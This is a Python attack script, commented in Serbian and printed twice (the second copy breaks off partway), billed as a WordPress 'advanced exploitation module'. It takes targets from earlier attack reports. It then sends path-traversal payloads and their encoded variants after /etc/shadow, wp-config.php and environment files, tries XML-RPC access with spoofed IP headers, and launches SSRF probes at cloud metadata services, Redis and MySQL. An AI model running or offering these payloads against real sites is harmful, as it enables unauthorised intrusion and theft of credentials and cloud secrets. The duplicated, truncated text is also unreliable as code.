#!/usr/bin/env python3
"""
WordPress Advanced Exploitation Module
Uƒçitava podatke iz reports/wp/*.json i izvr≈°ava napredne eksploitacije
"""

import json
import requests
import urllib.parse
import base64
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class WordPressAdvancedExploit:
    def __init__(self, reports_dir="reports/wp/"):
        self.reports_dir = reports_dir
        self.session = requests.Session()
        self.session.timeout = 10
        self.results = {}
        self.targets = []
        
        # User-Agent rotation za bypass
        self.user_agents = [
            "Mozilla/5.0 (WordPress/5.8; +http://wordpress.org/)",
            "WordPress/5.9.3; http://example.com/wordpress",
            "Mozilla/5.0 (compatible; WP-CLI/2.6.0)",
            "curl/7.68.0",
            "python-requests/2.28.1"
        ]
        
        # HTTP headers za bypass
        self.bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "192.168.1.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"}
        ]

    def load_wp_reports(self):
        """Uƒçitava sve JSON izve≈°taje iz reports/wp/ foldera"""
        print(f"üîç Uƒçitavam izve≈°taje iz {self.reports_dir}")
        
        if not os.path.exists(self.reports_dir):
            print(f"‚ùå Folder {self.reports_dir} ne postoji!")
            return False
            
        json_files = [f for f in os.listdir(self.reports_dir) if f.endswith('.json')]
        
        if not json_files:
            print(f"‚ùå Nema JSON fajlova u {self.reports_dir}")
            return False
            
        for json_file in json_files:
            try:
                with open(os.path.join(self.reports_dir, json_file), 'r') as f:
                    data = json.load(f)
                    self.parse_wp_data(data, json_file)
                    print(f"‚úÖ Uƒçitao: {json_file}")
            except Exception as e:
                print(f"‚ùå Gre≈°ka pri uƒçitavanju {json_file}: {e}")
                
        return len(self.targets) > 0

    def parse_wp_data(self, data, filename):
        """Parsira WordPress podatke iz JSON-a"""
        try:
            # Izvojna XML-RPC rezultate
            if "attack_results" in data and "xmlrpc_results" in data["attack_results"]:
                for xmlrpc in data["attack_results"]["xmlrpc_results"]:
                    if "url" in xmlrpc:
                        base_url = xmlrpc["url"].replace("/xmlrpc.php", "")
                        self.targets.append({
                            "base_url": base_url,
                            "xmlrpc_url": xmlrpc["url"],
                            "xmlrpc_accessible": xmlrpc.get("accessible", False),
                            "source": filename
                        })
            
            # Izvuci LFI rezultate
            if "attack_results" in data and "lfi_results" in data["attack_results"]:
                for lfi in data["attack_results"]["lfi_results"]:
                    if "base_url" in lfi:
                        base_url = lfi["base_url"]
                        # Dodaj ili a≈æuriraj postojeƒái target
                        existing = next((t for t in self.targets if t["base_url"] == base_url), None)
                        if existing:
                            existing["lfi_tests"] = lfi.get("lfi_tests", [])
                        else:
                            self.targets.append({
                                "base_url": base_url,
                                "lfi_tests": lfi.get("lfi_tests", []),
                                "source": filename
                            })
                            
        except Exception as e:
            print(f"‚ö†Ô∏è  Gre≈°ka pri parsiranju {filename}: {e}")

    def generate_lfi_mutations(self, base_payload="etc/passwd"):
        """Generi≈°e mutacije za LFI bypass"""
        mutations = []
        
        # Osnovni payloads
        basic_payloads = [
            f"../../../{base_payload}",
            f"....//....//....//{base_payload}",
            f"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/../{base_payload}",
            f"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\{base_payload}",
        ]
        
        # URL encoding mutations
        for payload in basic_payloads:
            mutations.extend([
                payload,
                urllib.parse.quote(payload),
                urllib.parse.quote(payload, safe=''),
                payload.replace("../", "%2e%2e%2f"),
                payload.replace("../", "..%252f"),
                payload.replace("../", "..%c0%af"),
                payload.replace("../", "..%c1%9c"),
            ])
        
        # PHP wrapper payloads
        php_wrappers = [
            f"php://filter/convert.base64-encode/resource=../../../{base_payload}",
            f"php://filter/read=string.rot13/resource=../../../{base_payload}",
            f"data://text/plain;base64,{base64.b64encode(f'../../../{base_payload}'.encode()).decode()}",
            f"file:///{base_payload}",
            f"expect://cat ../../../{base_payload}",
        ]
        mutations.extend(php_wrappers)
        
        # Null byte injection (za starije PHP verzije)
        null_bytes = [
            f"../../../{base_payload}%00",
            f"../../../{base_payload}%00.jpg",
            f"../../../{base_payload}\x00",
        ]
        mutations.extend(null_bytes)
        
        return list(set(mutations))  # Ukloni duplikate

    def test_lfi_mutations(self, target):
        """Testira LFI mutacije na target-u"""
        print(f"\nüß™ Testiram LFI mutacije na: {target['base_url']}")
        
        # Generi≈°i payloads za razliƒçite fajlove
        sensitive_files = [
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "proc/version",
            "proc/self/environ",
            "var/log/apache2/access.log",
            "var/log/nginx/access.log",
            "home/www-data/.bash_history",
            # WordPress specifiƒçni fajlovi
            "wp-config.php",
            "wp-content/debug.log",
            ".htaccess"
        ]
        
        vulnerable_endpoints = []
        
        for file_target in sensitive_files:
            mutations = self.generate_lfi_mutations(file_target)
            
            # Testiraj na razliƒçitim endpointovima
            test_endpoints = [
                "/wp-content/themes/twentytwenty/index.php",
                "/wp-content/themes/twentytwenty/functions.php",
                "/wp-includes/template-loader.php",
                "/wp-admin/admin-ajax.php",
                "/index.php",
            ]
            
            for endpoint in test_endpoints:
                for mutation in mutations[:10]:  # Ograniƒçi na 10 najdobrijih mutacija
                    try:
                        for param in ["file", "page", "include", "path", "template", "view"]:
                            test_url = f"{target['base_url']}{endpoint}?{param}={mutation}"
                            
                            # Rotiraj User-Agent i dodaj bypass header-e
                            headers = {"User-Agent": self.user_agents[0]}
                            if self.bypass_headers:
                                headers.update(self.bypass_headers[0])
                            
                            response = self.session.get(test_url, headers=headers, allow_redirects=False)
                            
                            # Analiziraj odgovor
                            if self.analyze_lfi_response(response, file_target):
                                vulnerable_endpoints.append({
                                    "url": test_url,
                                    "payload": mutation,
                                    "parameter": param,
                                    "file_target": file_target,
                                    "status_code": response.status_code,
                                    "response_length": len(response.text),
                                    "evidence": response.text[:200]
                                })
                                print(f"üéØ RANJIVOST PRONAƒêENA: {test_url}")
                                
                            time.sleep(0.1)  # Rate limiting
                            
                    except Exception as e:
                        continue
        
        return vulnerable_endpoints

    def analyze_lfi_response(self, response, target_file):
        """Analizira odgovor za znakove uspe≈°ne LFI eksploitacije"""
        if response.status_code == 200:
            text = response.text.lower()
            
            # Signatori za razliƒçite fajlove
            signatures = {
                "etc/passwd": ["root:", "bin:", "daemon:", "/bin/bash", "/bin/sh"],
                "etc/shadow": ["root:$", "bin:*", "daemon:*"],
                "etc/hosts": ["127.0.0.1", "localhost"],
                "proc/version": ["linux version", "gcc version"],
                "wp-config.php": ["db_name", "db_user", "db_password", "wp_debug"],
                ".htaccess": ["rewriteengine", "rewriterule", "options"]
            }
            
            target_sigs = signatures.get(target_file.split('/')[-1], [])
            
            for sig in target_sigs:
                if sig in text:
                    return True
                    
            # Generiƒçki indikatori
            if any(indicator in text for indicator in [
                "root:x:0:0:",
                "www-data:",
                "mysql:",
                "<?php",
                "define('db_",
                "[main]"
            ]):
                return True
                
        return False

    def test_xmlrpc_bypass(self, target):
        """Testira XML-RPC bypass tehnike"""
        if not target.get("xmlrpc_url"):
            return []
            
        print(f"\nüîß Testiram XML-RPC bypass na: {target['xmlrpc_url']}")
        
        bypassed_methods = []
        
        # XML-RPC metode za testiranje
        test_methods = [
            "system.listMethods",
            "wp.getUsersBlogs", 
            "wp.getUsers",
            "wp.getAuthors",
            "blogger.getUsersBlogs",
            "metaWeblog.getUsersBlogs"
        ]
        
        for method in test_methods:
            for ua in self.user_agents:
                for bypass_header in self.bypass_headers:
                    try:
                        headers = {
                            "User-Agent": ua,
                            "Content-Type": "text/xml",
                            **bypass_header
                        }
                        
                        xml_payload = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>{method}</methodName>
    <params>
    </params>
</methodCall>"""
                        
                        response = self.session.post(
                            target["xmlrpc_url"], 
                            data=xml_payload, 
                            headers=headers,
                            timeout=5
                        )
                        
                        if response.status_code == 200 and "methodResponse" in response.text:
                            bypassed_methods.append({
                                "method": method,
                                "user_agent": ua,
                                "bypass_header": bypass_header,
                                "response": response.text[:500]
                            })
                            print(f"‚úÖ XML-RPC Bypass uspe≈°an: {method}")
                            
                        time.sleep(0.1)
                        
                    except Exception as e:
                        continue
                        
        return bypassed_methods

    def test_ssrf_wordpress_features(self, target):
        """Testira SSRF kroz WordPress funkcionalnosti"""
        print(f"\nüåê Testiram SSRF kroz WordPress features na: {target['base_url']}")
        
        ssrf_results = []
        
        # SSRF test payloads za razliƒçite internal servise
        ssrf_payloads = {
            # Internal network scanning
            "internal_ssh": "http://127.0.0.1:22",
            "internal_mysql": "http://127.0.0.1:3306", 
            "internal_redis": "http://127.0.0.1:6379",
            "internal_mongodb": "http://127.0.0.1:27017",
            "internal_elasticsearch": "http://127.0.0.1:9200",
            "internal_ftp": "http://127.0.0.1:21",
            
            # Cloud metadata endpoints
            "aws_metadata": "http://169.254.169.254/latest/meta-data/",
            "gcp_metadata": "http://metadata.google.internal/computeMetadata/v1/",
            "azure_metadata": "http://169.254.169.254/metadata/instance",
            "digitalocean_metadata": "http://169.254.169.254/metadata/v1/",
            
            # File protocol tests
            "local_file_etc_passwd": "file:///etc/passwd",
            "local_file_proc_version": "file:///proc/version",
            "local_file_wp_config": "file:///var/www/html/wp-config.php",
            
            # LDAP injection
            "ldap_injection": "ldap://127.0.0.1:389/",
            
            # Gopher protocol (advanced)
            "gopher_mysql": "gopher://127.0.0.1:3306/_",
            "gopher_redis": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
        }
        
        # WordPress SSRF attack vectors
        ssrf_vectors = [
            # REST API endpoints
            {
                "endpoint": "/wp-json/wp/v2/media",
                "method": "POST",
                "param": "source_url",
                "content_type": "application/json",
                "description": "Media Library URL Import"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST", 
                "param": "url",
                "data_extra": {"action": "fetch-list"},
                "description": "AJAX URL Fetch"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "feed_url", 
                "data_extra": {"action": "dashboard_primary"},
                "description": "Dashboard RSS Feed"
            },
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "url",
                "data_extra": {"action": "wp_privacy_export_personal_data"},
                "description": "Privacy Export"
            },
            # Pingback/Trackback
            {
                "endpoint": "/xmlrpc.php",
                "method": "POST",
                "param": "source_uri",
                "xml_method": "pingback.ping", 
                "description": "XML-RPC Pingback"
            },
            # Theme customizer
            {
                "endpoint": "/wp-admin/customize.php",
                "method": "GET",
                "param": "url",
                "description": "Theme Customizer Preview"
            },
            # Plugin update checker
            {
                "endpoint": "/wp-admin/admin-ajax.php",
                "method": "POST",
                "param": "plugin_url",
                "data_extra": {"action": "update-plugin"},
                "description": "Plugin Update Check"
            }
        ]
        
        for vector in ssrf_vectors:
            print(f"   üéØ Testiram: {vector['description']}")
            
            for payload_name, payload_url in ssrf_payloads.items():
                try:
                    start_time = time.time()
                    
                    # Pripremi request na osnovu vektora
                    if vector["method"] == "POST":
                        if "xml_method" in vector:
                            # XML-RPC pingback
                            xml_data = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>{vector["xml_method"]}</methodName>
    <params>
        <param><value><string>{target['base_url']}</string></value></param>
        <param><value><string>{payload_url}</string></value></param>
    </params>
</methodCall>"""
                            headers = {"Content-Type": "text/xml"}
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                data=xml_data,
                                headers=headers,
                                timeout=15
                            )
                        elif vector.get("content_type") == "application/json":
                            # JSON REST API
                            json_data = {vector["param"]: payload_url}
                            if "data_extra" in vector:
                                json_data.update(vector["data_extra"])
                                
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                json=json_data,
                                timeout=15
                            )
                        else:
                            # Regular POST
                            post_data = {vector["param"]: payload_url}
                            if "data_extra" in vector:
                                post_data.update(vector["data_extra"])
                                
                            response = self.session.post(
                                f"{target['base_url']}{vector['endpoint']}",
                                data=post_data,
                                timeout=15
                            )
                    else:
                        # GET request
                        params = {vector["param"]: payload_url}
                        response = self.session.get(
                            f"{target['base_url']}{vector['endpoint']}",
                            params=params,
                            timeout=15
                        )
                    
                    response_time = time.time() - start_time
                    
                    # Analiziraj response za SSRF indikatore
                    ssrf_detected = self.analyze_ssrf_response(
                        response, payload_url, payload_name, response_time
                    )
                    
                    if ssrf_detected:
                        ssrf_results.append({
                            "vector": vector["description"],
                            "endpoint": vector["endpoint"],
                            "payload_name": payload_name,
                            "payload_url": payload_url,
                            "method": vector["method"],
                            "parameter": vector["param"],
                            "status_code": response.status_code,
                            "response_time": response_time,
                            "response_length": len(response.text),
                            "evidence": response.text[:500],
                            "detection_reason": ssrf_detected
                        })
                        print(f"üö® SSRF DETECTED: {vector['description']} -> {payload_name}")
                    
                    time.sleep(0.2)  # Rate limiting
                    
                except requests.exceptions.Timeout:
                    # Timeout mo≈æe biti indikator uspe≈°nog SSRF-a
                    ssrf_results.append({
                        "vector": vector["description"],
                        "endpoint": vector["endpoint"], 
                        "payload_name": payload_name,
                        "payload_url": payload_url,
                        "method": vector["method"],
                        "parameter": vector["param"],
                        "status_code": "TIMEOUT",
                        "response_time": 15.0,
                        "detection_reason": "Request timeout - possible SSRF"
                    })
                    print(f"‚è∞ TIMEOUT (possible SSRF): {vector['description']} -> {payload_name}")
                    
                except Exception as e:
                    continue
                    
        return ssrf_results
    
    def analyze_ssrf_response(self, response, payload_url, payload_name, response_time):
        """Analizira response za SSRF indikatore"""
        
        # 1. Timeout ili sporost (mo≈æe znaƒçiti successful connection)
        if response_time > 10:
            return "Slow response - possible internal connection"
            
        # 2. Status code analiza
        if response.status_code in [200, 302, 403]:
            text = response.text.lower()
            
            # AWS metadata response patterns
            if "aws" in payload_name and any(aws_sig in text for aws_sig in [
                "ami-id", "instance-id", "instance-type", "local-hostname", 
                "security-groups", "iam/security-credentials"
            ]):
                return "AWS metadata exposed"
                
            # GCP metadata response patterns  
            if "gcp" in payload_name and any(gcp_sig in text for gcp_sig in [
                "computemetadata", "instance/", "project/", "service-accounts"
            ]):
                return "GCP metadata exposed"
                
            # File protocol success
            if "file://" in payload_url and any(file_sig in text for file_sig in [
                "root:", "www-data:", "<?php", "define(", "mysql:"
            ]):
                return "Local file access via file:// protocol"
                
            # Internal service banners
            service_banners = {
                ":22": ["ssh", "openssh", "protocol"],
                ":3306": ["mysql", "mariadb", "access denied for user"],
                ":6379": ["redis", "wrong number of arguments"],
                ":27017": ["mongodb", "connection refused", "unauthorized"],
                ":9200": ["elasticsearch", "cluster_name", "version"],
                ":21": ["ftp", "welcome", "220"]
            }
            
            for port, banners in service_banners.items():
                if port in payload_url and any(banner in text for banner in banners):
                    return f"Internal service banner detected ({port})"
                    
        # 3. Error message analysis (mo≈æe otkriti internal structure)
        error_indicators = [
            "connection refused",
            "connection timed out", 
            "could not resolve host",
            "no route to host",
            "operation timed out",
            "curl error",
            "failed to open stream",
            "network is unreachable"
        ]
        
        if any(error in response.text.lower() for error in error_indicators):
            return "Error message reveals internal network attempt"
            
        # 4. Response size anomaly
        if len(response.text) > 1000 and response.status_code == 200:
            return "Large response - possible data exfiltration"
            
        return False

    def test_theme_specific_exploits(self, target):
        """Testira eksploite specifiƒçne za TwentyTwenty temu"""
        print(f"\nüé® Testiram TwentyTwenty tema eksploite na: {target['base_url']}")
        
        theme_exploits = []
        
        # TwentyTwenty specifiƒçni fajlovi
        theme_files = [
            "/wp-content/themes/twentytwenty/functions.php",
            "/wp-content/themes/twentytwenty/style.css",
            "/wp-content/themes/twentytwenty/index.php",
            "/wp-content/themes/twentytwenty/single.php",
            "/wp-content/themes/twentytwenty/header.php",
            "/wp-content/themes/twentytwenty/footer.php",
            "/wp-content/themes/twentytwenty/screenshot.png",
            "/wp-content/themes/twentytwenty/readme.txt"
        ]
        
        for theme_file in theme_files:
            try:
                url = f"{target['base_url']}{theme_file}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Analiziraj sadr≈æaj za osetljive informacije
                    content = response.text
                    
                    sensitive_patterns = [
                        r"define\s*\(\s*['\"].*?['\"]\s*,\s*['\"].*?['\"]\s*\)",
                        r"\$.*?=\s*['\"].*?['\"]",
                        r"mysql_.*?\(",
                        r"mysqli_.*?\(",
                        r"PDO::",
                        r"password.*?=",
                        r"secret.*?=",
                        r"api.*?key"
                    ]
                    
                    import re
                    findings = []
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            findings.extend(matches[:3])  # Ograniƒçi na 3 match-a
                    
                    if findings or len(content) > 100:
                        theme_exploits.append({
                            "file": theme_file,
                            "url": url,
                            "accessible": True,
                            "size": len(content),
                            "findings": findings,
                            "content_preview": content[:300]
                        })
                        print(f"üìÅ Dostupan fajl: {theme_file}")
                        
            except Exception as e:
                continue
                
        return theme_exploits

    def run_full_exploitation(self):
        """Pokreƒáe kompletnu naprednu eksploitaciju"""
        print("üöÄ WordPress Advanced Exploitation Module")
        print("=" * 50)
        
        if not self.load_wp_reports():
            print("‚ùå Nema podataka za eksploitaciju!")
            return
            
        print(f"üéØ Pronaƒëeno {len(self.targets)} target(a) za eksploitaciju")
        
        all_results = {}
        
        for i, target in enumerate(self.targets, 1):
            print(f"\n{'='*50}")
            print(f"üéØ TARGET {i}/{len(self.targets)}: {target['base_url']}")
            print(f"{'='*50}")
            
            target_results = {
                "target_info": target,
                "lfi_mutations": [],
                "xmlrpc_bypass": [],
                "theme_exploits": [],
                "timestamp": datetime.now().isoformat()
            }
            
            # Test LFI mutations
            try:
                target_results["lfi_mutations"] = self.test_lfi_mutations(target)
            except Exception as e:
                print(f"‚ùå LFI test error: {e}")
                
            # Test XML-RPC bypass
            try:
                target_results["xmlrpc_bypass"] = self.test_xmlrpc_bypass(target)
            except Exception as e:
                print(f"‚ùå XML-RPC test error: {e}")
                
            # Test theme-specific exploits
            try:
                target_results["theme_exploits"] = self.test_theme_specific_exploits(target)
            except Exception as e:
                print(f"‚ùå Theme exploit test error: {e}")
                
            all_results[target["base_url"]] = target_results
            
        # Saƒçuvaj rezultate
        self.save_results(all_results)
        self.print_summary(all_results)

    def save_results(self, results):
        """ƒåuva rezultate u JSON fajl"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/wp/wp_advanced_exploit_{timestamp}.json"
        
        os.makedirs("reports/wp", exist_ok=True)
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
            
        print(f"\nüíæ Rezultati saƒçuvani u: {filename}")

    def print_summary(self, results):
        """Prikazuje sa≈æetak rezultata"""
        print("\n" + "="*60)
        print("üìä SA≈ΩETAK REZULTATA")
        print("="*60)
        
        total_lfi = 0
        total_xmlrpc = 0
        total_theme = 0
        
        for target_url, data in results.items():
            lfi_count = len(data["lfi_mutations"])
            xmlrpc_count = len(data["xmlrpc_bypass"])
            theme_count = len(data["theme_exploits"])
            
            total_lfi += lfi_count
            total_xmlrpc += xmlrpc_count
            total_theme += theme_count
            
            if lfi_count > 0 or xmlrpc_count > 0 or theme_count > 0:
                print(f"\nüéØ {target_url}")
                if lfi_count > 0:
                    print(f"   üß™ LFI ranjivosti: {lfi_count}")
                if xmlrpc_count > 0:
                    print(f"   üîß XML-RPC bypass: {xmlrpc_count}")
                if theme_count > 0:
                    print(f"   üé® Dostupni tema fajlovi: {theme_count}")
        
        print(f"\nüìà UKUPNO:")
        print(f"   üß™ LFI ranjivosti: {total_lfi}")
        print(f"   üîß XML-RPC bypass: {total_xmlrpc}")
        print(f"   üé® Tema eksploiti: {total_theme}")
        
        if total_lfi > 0 or total_xmlrpc > 0 or total_theme > 0:
            print(f"\nüéâ EKSPLOITACIJA USPE≈†NA! Pronaƒëeno ukupno {total_lfi + total_xmlrpc + total_theme} ranjivosti!")
        else:
            print(f"\nüõ°Ô∏è  Svi target-i su dobro za≈°tiƒáeni.")

if __name__ == "__main__":
    # Pokreni eksploitaciju
    exploiter = WordPressAdvancedExploit()
    exploiter.run_full_exploitation()

#!/usr/bin/env python3
"""
WordPress Advanced Exploitation Module
Uƒçitava podatke iz reports/wp/*.json i izvr≈°ava napredne eksploitacije
"""

import json
import requests
import urllib.parse
import base64
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class WordPressAdvancedExploit:
    def __init__(self, reports_dir="reports/wp/"):
        self.reports_dir = reports_dir
        self.session = requests.Session()
        self.session.timeout = 10
        self.results = {}
        self.targets = []
        
        # User-Agent rotation za bypass
        self.user_agents = [
            "Mozilla/5.0 (WordPress/5.8; +http://wordpress.org/)",
            "WordPress/5.9.3; http://example.com/wordpress",
            "Mozilla/5.0 (compatible; WP-CLI/2.6.0)",
            "curl/7.68.0",
            "python-requests/2.28.1"
        ]
        
        # HTTP headers za bypass
        self.bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "192.168.1.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"}
        ]

    def load_wp_reports(self):
        """Uƒçitava sve JSON izve≈°taje iz reports/wp/ foldera"""
        print(f"üîç Uƒçitavam izve≈°taje iz {self.reports_dir}")
        
        if not os.path.exists(self.reports_dir):
            print(f"‚ùå Folder {self.reports_dir} ne postoji!")
            return False
            
        json_files = [f for f in os.listdir(self.reports_dir) if f.endswith('.json')]
        
        if not json_files:
            print(f"‚ùå Nema JSON fajlova u {self.reports_dir}")
            return False
            
        for json_file in json_files:
            try:
                with open(os.path.join(self.reports_dir, json_file), 'r') as f:
                    data = json.load(f)
                    self.parse_wp_data(data, json_file)
                    print(f"‚úÖ Uƒçitao: {json_file}")
            except Exception as e:
                print(f"‚ùå Gre≈°ka pri uƒçitavanju {json_file}: {e}")
                
        return len(self.targets) > 0

    def parse_wp_data(self, data, filename):
        """Parsira WordPress podatke iz JSON-a"""
        try:
            # Izvojna XML-RPC rezultate
            if "attack_results" in data and "xmlrpc_results" in data["attack_results"]:
                for xmlrpc in data["attack_results"]["xmlrpc_results"]:
                    if "url" in xmlrpc:
                        base_url = xmlrpc["url"].replace("/xmlrpc.php", "")
                        self.targets.append({
                            "base_url": base_url,
                            "xmlrpc_url": xmlrpc["url"],
                            "xmlrpc_accessible": xmlrpc.get("accessible", False),
                            "source": filename
                        })
            
            # Izvuci LFI rezultate
            if "attack_results" in data and "lfi_results" in data["attack_results"]:
                for lfi in data["attack_results"]["lfi_results"]:
                    if "base_url" in lfi:
                        base_url = lfi["base_url"]
                        # Dodaj ili a≈æuriraj postojeƒái target
                        existing = next((t for t in self.targets if t["base_url"] == base_url), None)
                        if existing:
                            existing["lfi_tests"] = lfi.get("lfi_tests", [])
                        else:
                            self.targets.append({
                                "base_url": base_url,
                                "lfi_tests": lfi.get("lfi_tests", []),
                                "source": filename
                            })
                            
        except Exception as e:
            print(f"‚ö†Ô∏è  Gre≈°ka pri parsiranju {filename}: {e}")

    def generate_lfi_mutations(self, base_payload="etc/passwd"):
        """Generi≈°e mutacije za LFI bypass"""
        mutations = []
        
        # Osnovni payloads
        basic_payloads = [
            f"../../../{base_payload}",
            f"....//....//....//{base_payload}",
            f"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/../{base_payload}",
            f"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\{base_payload}",
        ]
        
        # URL encoding mutations
        for payload in basic_payloads:
            mutations.extend([
                payload,
                urllib.parse.quote(payload),
                urllib.parse.quote(payload, safe=''),
                payload.replace("../", "%2e%2e%2f"),
                payload.replace("../", "..%252f"),
                payload.replace("../", "..%c0%af"),
                payload.replace("../", "..%c1%9c"),
            ])
        
        # PHP wrapper payloads
        php_wrappers = [
            f"php://filter/convert.base64-encode/resource=../../../{base_payload}",
            f"php://filter/read=string.rot13/resource=../../../{base_payload}",
            f"data://text/plain;base64,{base64.b64encode(f'../../../{base_payload}'.encode()).decode()}",
            f"file:///{base_payload}",
            f"expect://cat ../../../{base_payload}",
        ]
        mutations.extend(php_wrappers)
        
        # Null byte injection (za starije PHP verzije)
        null_bytes = [
            f"../../../{base_payload}%00",
            f"../../../{base_payload}%00.jpg",
            f"../../../{base_payload}\x00",
        ]
        mutations.extend(null_bytes)
        
        return list(set(mutations))  # Ukloni duplikate

    def test_lfi_mutations(self, target):
        """Testira LFI mutacije na target-u"""
        print(f"\nüß™ Testiram LFI mutacije na: {target['base_url']}")
        
        # Generi≈°i payloads za razliƒçite fajlove
        sensitive_files = [
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "proc/version",
            "proc/self/environ",
            "var/log/apache2/access.log",
            "var/log/nginx/access.log",
            "home/www-data/.bash_history",
            # WordPress specifiƒçni fajlovi
            "wp-config.php",
            "wp-content/debug.log",
            ".htaccess"
        ]
        
        vulnerable_endpoints = []
        
        for file_target in sensitive_files:
            mutations = self.generate_lfi_mutations(file_target)
            
            # Testiraj na razliƒçitim endpointovima
            test_endpoints = [
                "/wp-content/themes/twentytwenty/index.php",
                "/wp-content/themes/twentytwenty/functions.php",
                "/wp-includes/template-loader.php",
                "/wp-admin/admin-ajax.php",
                "/index.php",
            ]
            
            for endpoint in test_endpoints:
                for mutation in mutations[:10]:  # Ograniƒçi na 10 najdobrijih mutacija
                    try:
                        for param in ["file", "page", "include", "path", "template", "view"]:
                            test_url = f"{target['base_url']}{endpoint}?{param}={mutation}"
                            
                            # Rotiraj User-Agent i dodaj bypass header-e
                            headers = {"User-Agent": self.user_agents[0]}
                            if self.bypass_headers:
                                headers.update(self.bypass_headers[0])
                            
                            response = self.session.get(test_url, headers=headers, allow_redirects=False)
                            
                            # Analiziraj odgovor
                            if self.analyze_lfi_response(response, file_target):
                                vulnerable_endpoints.append({
                                    "url": test_url,
                                    "payload": mutation,
                                    "parameter": param,
                                    "file_target": file_target,
                                    "status_code": response.status_code,
                                    "response_length": len(response.text),
                                    "evidence": response.text[:200]
                                })
                                print(f"üéØ RANJIVOST PRONAƒêENA: {test_url}")
                                
                            time.sleep(0.1)  # Rate limiting
                            
                    except Exception as e:
                        continue
        
        return vulnerable_endpoints

    def analyze_lfi_response(self, response, target_file):
        """Analizira odgovor za znakove uspe≈°ne LFI eksploitacije"""
        if response.status_code == 200:
            text = response.text.lower()
            
            # Signatori za razliƒçite fajlove
            signatures = {
                "etc/passwd": ["root:", "bin:", "daemon:", "/bin/bash", "/bin/sh"],
                "etc/shadow": ["root:$", "bin:*", "daemon:*"],
                "etc/hosts": ["127.0.0.1", "localhost"],
                "proc/version": ["linux version", "gcc version"],
                "wp-config.php": ["db_name", "db_user", "db_password", "wp_debug"],
                ".htaccess": ["rewriteengine", "rewriterule", "options"]
            }
            
            target_sigs = signatures.get(target_file.split('/')[-1], [])
            
            for sig in target_sigs:
                if sig in text:
                    return True
                    
            # Generiƒçki indikatori
            if any(indicator in text for indicator in [
                "root:x:0:0:",
                "www-data:",
                "mysql:",
                "<?php",
                "define('db_",
                "[main]"
            ]):
                return True
                
        return False

    def test_xmlrpc_bypass(self, target):
        """Testira XML-RPC bypass tehnike"""
        if not target.get("xmlrpc_url"):
            return []
            
        print(f"\nüîß Testiram XML-RPC bypass na: {target['xmlrpc_url']}")
        
        bypassed_methods = []
        
        # XML-RPC metode za testiranje
        test_methods = [
            "system.listMethods",
            "wp.getUsersBlogs", 
            "wp.getUsers",
            "wp.getAuthors",
            "blogger.getUsersBlogs",
            "metaWeblog.getUsersBlogs"
        ]
        
        for method in test_methods:
            for ua in self.user_agents:
                for bypass_header in self.bypass_headers:
                    try:
                        headers = {
                            "User-Agent": ua,
                            "Content-Type": "text/xml",
                            **bypass_header
                        }
                        
                        xml_payload = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>{method}</methodName>
    <params>
    </params>
</methodCall>"""
                        
                        response = self.session.post(
                            target["xmlrpc_url"], 
                            data=xml_payload, 
                            headers=headers,
                            timeout=5
                        )
                        
                        if response.status_code == 200 and "methodResponse" in response.text:
                            bypassed_methods.append({
                                "method": method,
                                "user_agent": ua,
                                "bypass_header": bypass_header,
                                "response": response.text[:500]
                            })
                            print(f"‚úÖ XML-RPC Bypass uspe≈°an: {method}")
                            
                        time.sleep(0.1)
                        
                    except Exception as e:
                        continue
                        
        return bypassed_methods

    def test_ssrf_wordpress_features(self, target):
        """Testira SSRF kroz WordPress funkcionalnosti"""
        print(f"\nüåê Testiram SSRF kroz WordPress features na: {target['base_url']}")
        
        ssrf_results = []
        
        # SSRF test payloads za razliƒçite internal servise
        ssrf_payloads = {
            # Internal network scanning
            "internal_ssh": "http://127.0.0.1:22",
            "internal_mysql": "http://127.0.0.1:3306", 
            "internal_redis": "http://127.0.0.1:6379",
            "internal_mongodb": "http://127.0.0.1:27017",
            "internal_elasticsearch": "http://127.0.0.1:9200",
            "internal_ftp": "http://127.0.0.1:21",
            
            # Cloud metadata endpoints
            "aws_metadata": "http://169.254.169.254/latest/meta-data/",
            "gcp_metadata": "http://metadata.google.internal/computeMetadata/v1/",
            "azure_metadata": "http://169.254.169.254/metadata/instance",
            "digitalocean_metadata": "http://169.254.169.254/metadata/v1/",
            
            # File protocol tests
            "local_file_etc_passwd": "file:///etc/passwd",
            "local_file_proc_version": "file:///proc/version",
            "local_file_wp_config": "file:///var/www/html/wp-config.php",
            
            # LDAP injection
            "ldap_injection": "ldap://127.0.0.1:389/",
            
            # Gopher protocol (advanced)
            "gopher_mysql": "gopher://127.0.0.1:3306/_",
